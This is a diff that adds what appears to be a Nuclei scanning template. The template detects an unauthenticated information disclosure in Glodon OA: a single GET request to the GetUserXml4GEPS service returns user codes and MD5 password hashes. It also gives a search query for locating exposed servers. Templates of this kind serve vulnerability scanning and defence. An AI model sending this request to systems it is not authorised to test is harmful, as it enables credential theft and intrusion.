@@ -1,0 +1,31 @@
+id: glodon-GetUserXml4GEPS-disclosure
+
+info:
+  name: 广联达 OA GetUserXml4GEPS - disclosure
+  author: linuxlz,pphua
+  severity: high
+  reference:
+    - none
+  metadata:
+    hunter-query: web.body="/Services/Identification/"
+    veified: true
+  tags: glodon,oa,linkworks,infoleak
+
+http:
+  - raw:
+      - |
+        GET /Org/service/Service.asmx/GetUserXml4GEPS HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        
+      - type: word
+        part: body
+        words:
+          - 'USR_PWDMD5'
+          - 'USR_CODE'
+        condition: and
